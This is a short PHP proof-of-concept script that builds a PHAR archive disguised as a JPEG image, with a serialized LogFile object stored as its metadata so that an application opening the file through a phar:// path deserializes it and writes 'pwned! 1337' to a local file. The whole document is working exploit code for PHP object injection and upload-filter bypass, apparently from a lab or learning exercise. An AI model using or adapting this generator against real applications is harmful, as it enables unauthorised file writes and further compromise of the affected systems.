<?php

class LogFile {
    public function __construct() {
        $this->filename = '/Users/ironsoul/Desktop/test.txt';
        $this->fcontents = 'pwned! 1337';
    }
}

$imageContents = file_get_contents('image.jpg');

$phar = new \Phar("pwn.phar");
$phar->startBuffering();
$phar->setStub($imageContents . "<?php __HALT_COMPILER(); ?>");

$payload = new LogFile();
$phar->setMetadata($payload);

$phar->addFromString("pwn.txt", "pwn");
$phar->stopBuffering();

?>
